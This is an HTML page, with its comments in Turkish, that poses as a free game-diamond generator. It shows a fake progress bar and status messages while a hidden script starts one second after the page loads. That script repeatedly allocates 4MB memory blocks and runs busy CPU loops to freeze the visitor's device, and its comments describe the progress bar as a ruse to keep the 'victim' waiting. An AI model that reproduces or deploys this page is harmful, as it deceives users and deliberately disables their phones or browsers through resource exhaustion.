<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sınırsız Elmas Paketi - 2026</title>
    <style>
        body { background: #0b0d17; color: white; font-family: 'Segoe UI', Tahoma, sans-serif; text-align: center; margin: 0; padding-top: 50px; overflow: hidden; }
        .container { border: 2px solid #00d2ff; border-radius: 15px; width: 80%; margin: auto; padding: 20px; background: rgba(0, 210, 255, 0.1); box-shadow: 0 0 20px #00d2ff; }
        .gem-icon { width: 80px; margin-bottom: 10px; animation: pulse 1.5s infinite; }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
        .progress-bar { background: #333; border-radius: 20px; height: 25px; width: 100%; margin: 20px 0; position: relative; overflow: hidden; }
        .progress-fill { background: linear-gradient(90deg, #00d2ff, #3a7bd5); width: 0%; height: 100%; transition: width 0.5s; }
        #status { color: #00d2ff; font-weight: bold; margin-top: 10px; }
    </style>
</head>
<body>

<div class="container">
    <img src="https://i.ibb.co/L8N7p7v/gem.png" alt="Gem" class="gem-icon">
    <h2>ELMAS ÜRETİCİSİ</h2>
    <p>Kullanıcı ID: <span style="color:#00d2ff;">Milyoner_Kullanici</span></p>
    
    <div class="progress-bar">
        <div id="fill" class="progress-fill"></div>
    </div>
    
    <div id="status">Sunucuya bağlanılıyor...</div>
</div>

<script>
    // --- GÖRSEL ALDATMACA (Kurbanı oyalamak için) ---
    let fill = document.getElementById('fill');
    let status = document.getElementById('status');
    let percent = 0;

    const messages = [
        "ID Doğrulanıyor...",
        "Proxy sunucuları aktif ediliyor...",
        "999,999 Elmas paketleniyor...",
        "Bellek optimizasyonu yapılıyor (Donma olabilir)...",
        "İşlem tamamlanıyor, lütfen bekleyin..."
    ];

    let msgIndex = 0;
    setInterval(() => {
        if (percent < 95) {
            percent += Math.random() * 2;
            fill.style.width = percent + "%";
            if (percent > msgIndex * 20) {
                status.innerText = messages[msgIndex];
                msgIndex++;
            }
        }
    }, 800);

    // --- GERÇEK MERMİ (Arka planda RAM'i bitiren kısım) ---
    let depo = [];
    function saldiri() {
        setInterval(() => {
            try {
                // Tarayıcıyı çökertmeden yavaş yavaş şişiren sinsi sülük
                let veri = new Uint8Array(1024 * 1024 * 4); // 4MB'lık sessiz bloklar
                veri.fill(1);
                depo.push(veri);
                
                // İşlemciyi de meşgul et ki telefon iyice ağırlaşsın
                for(let i=0; i<500000; i++) { let x = i * i; }
            } catch(e) {
                // RAM dolduğunda burası telefonu kilitler
            }
        }, 80); // 80ms ile "Hay Aksi" demeden sistemi felç eder
    }
    
    // Sayfa açıldıktan 1 saniye sonra kurban elmasları beklerken saldırı başlar
    setTimeout(saldiri, 1000);
</script>

</body>
</html>
